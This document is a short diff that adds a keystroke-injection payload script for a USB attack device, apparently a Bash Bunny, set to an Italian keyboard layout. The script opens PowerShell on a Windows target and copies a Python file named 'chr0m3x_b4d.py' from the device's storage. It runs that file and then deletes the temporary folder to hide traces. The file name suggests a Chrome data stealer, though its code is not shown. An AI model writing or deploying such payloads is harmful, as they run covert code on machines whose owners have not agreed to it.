@@ -1,0 +1,8 @@
+LED SETUP
+ATTACKMODE HID STORAGE
+SET_LANGUAGE IT
+GET SWITCH_POSITION
+LED ATTACK
+RUN WIN powershell "mkdir $HOME\b4dtmp; cd $HOME\b4dtmp; cp D:\payloads\\$SWITCH_POSITION\chr0m3x_b4d.py .; python $HOME\b4dtmp\chr0m3x_b4d.py; cd ..; rm -r $HOME\b4dtmp;"
+DELAY 2000
+LED FINISH
